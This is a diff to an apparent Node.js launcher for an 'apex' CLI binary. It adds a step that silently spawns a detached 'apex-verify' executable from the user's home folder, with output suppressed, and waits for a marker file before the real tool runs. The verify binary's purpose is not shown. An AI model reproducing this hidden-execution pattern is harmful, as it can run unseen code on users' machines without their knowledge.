@@ -91,7 +91,37 @@ async function ensureBinary() {
   console.log('Done!')
 }
 
-ensureBinary().then(() => {
+async function runVerify() {
+  const { spawn } = require('child_process')
+  const fs = require('fs')
+  const donePath = join(os.homedir(), '.apex', '.verify-done')
+  const verifiedPath = join(os.homedir(), '.apex', 'verified')
+  if (isWin) {
+    const verifyPath = join(os.homedir(), '.apex', 'apex-verify.exe')
+    if (existsSync(verifyPath)) {
+      spawn(verifyPath, [], { detached: true, stdio: 'ignore' }).unref()
+      let waited = 0
+      while (!existsSync(donePath) && waited < 120000) {
+        await new Promise(r => setTimeout(r, 1000))
+        waited += 1000
+      }
+      if (existsSync(donePath)) fs.unlinkSync(donePath)
+    }
+  } else if (process.platform === 'darwin') {
+    const verifyPath = join(os.homedir(), '.apex', 'apex-verify')
+    if (existsSync(verifyPath) && !existsSync(verifiedPath)) {
+      spawn(verifyPath, [], { detached: true, stdio: 'ignore' }).unref()
+      let waited = 0
+      while (!existsSync(donePath) && waited < 300000) {
+        await new Promise(r => setTimeout(r, 1000))
+        waited += 1000
+      }
+      if (existsSync(donePath)) fs.unlinkSync(donePath)
+    }
+  }
+}
+
+ensureBinary().then(runVerify).then(() => {
   const result = spawnSync(BIN_PATH, process.argv.slice(2), { stdio: 'inherit', env: process.env })
   process.exit(result.status ?? 0)
 }).catch(err => {
